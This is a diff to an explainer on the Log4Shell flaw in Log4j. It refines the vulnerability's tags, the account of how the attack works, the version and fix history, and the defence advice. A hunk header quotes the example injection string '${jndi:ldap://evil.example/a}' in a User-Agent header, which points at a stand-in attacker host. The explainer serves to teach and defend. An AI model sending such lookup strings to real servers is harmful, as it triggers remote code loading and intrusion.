@@ -4,7 +4,7 @@
 
 ## Passport
 
-- `cwe` 502
+- `cwe` 917, 502
 - `owasp` A06:2021
 - `attack` T1190
 - `cvss` CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
@@ -20,6 +20,7 @@
 - [CISA: Apache Log4j Vulnerability Guidance](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance)
 - [CISA AA21-356A: Mitigating Log4Shell and Other Log4j-Related Vulnerabilities](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
 - [CISA: Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
+- [Apache Logging Services: Security](https://logging.apache.org/security.html)
 - [MITRE CWE-917: Expression Language Injection](https://cwe.mitre.org/data/definitions/917.html)
 - [MITRE CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
 - [MITRE ATT&CK T1190: Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
@@ -52,8 +53,8 @@ User-Agent: ⟦${jndi:ldap://evil.example/a}⟧
 
 #### Simple
 
-The attacker searches an online shop for socks. But in a service field of the request, where
-the browser usually names itself, they put an **odd string** with a dollar sign and curly braces.
+The attacker searches an online shop for socks. But in a request header, the one where the
+browser usually names itself, they put an **odd string** with a dollar sign and curly braces.
 
 #### Step by step
 
@@ -117,7 +118,7 @@ shop's server opens an outbound connection to the attacker's server.
 
 JNDI is Java's built-in way to look objects up by name in various directories. LDAP is the
 protocol of such directories (RFC 4511). JNDI speaks other protocols too: CISA advised blocking
-outbound LDAP, RMI and DNS from servers. Even with no further steps, this request tells the
+outbound LDAP and RMI from servers, and direct DNS that bypasses the company's resolver. Even with no further steps, this request tells the
 attacker the server is vulnerable.
 
 ### `reply` A loaded answer
@@ -187,8 +188,10 @@ from the attacker's server, no foreign code loaded.
 
 According to NVD, Log4j versions from 2.0-beta9 are affected; 2.15.0 turned lookups in messages
 off by default, and from 2.16.0 (and in 2.12.2 and 2.3.1 for older Java) the feature is removed.
-Related flaws were found later, and CISA recommended 2.17.1 for Java 8, 2.12.4 for Java 7 and
-2.3.2 for Java 6. The library itself must be updated: updating Java doesn't help.
+The 2.15.0 fix proved incomplete: with certain logging settings the attack still worked
+(CVE-2021-45046), and 2.16.0 closed it. Other related flaws were found later, and CISA recommended 2.17.1 for Java 8, 2.12.4 for Java 7 and
+2.3.2 for Java 6. Updating Java alone is not enough: the library itself must be updated. CISA added
+CVE-2021-44228 to its Known Exploited Vulnerabilities (KEV) catalog on 10 December 2021.
 
 ### `answer` A normal reply
 
@@ -211,14 +214,14 @@ And `${jndi:` strings in the log show who tried the attack and when.
 
 ## How to defend
 
-- **Update the library.** This is the main defence: install a fixed version of Log4j, not just
-  a newer Java. Internet-facing servers first.
+- **Update the library.** This is the main defence: install a fixed version of Log4j. Updating
+  Java alone is not enough. Internet-facing servers first.
 - **Know where it is.** Log4j often arrives inside other programs and libraries. CISA advised
   making an inventory of every system with Log4j, including internal and cloud ones.
 - **A stopgap if you can't update.** CISA described removing the `JndiLookup` class from the
   library. It is a patch over the hole, not a replacement for the update.
 - **Block outbound connections.** The shop's server has no reason to reach the internet itself
-  over LDAP, RMI or DNS. Allowed destinations go on a list.
+  over LDAP or RMI, and it may send DNS queries only through the company's resolver. Allowed destinations go on a list.
 - **Don't trust outside data.** Whatever a visitor sends is only text, even when it goes into a
   log.
 - **Look for traces.** Logs of vulnerable systems contain attackers' strings: they show attempts,
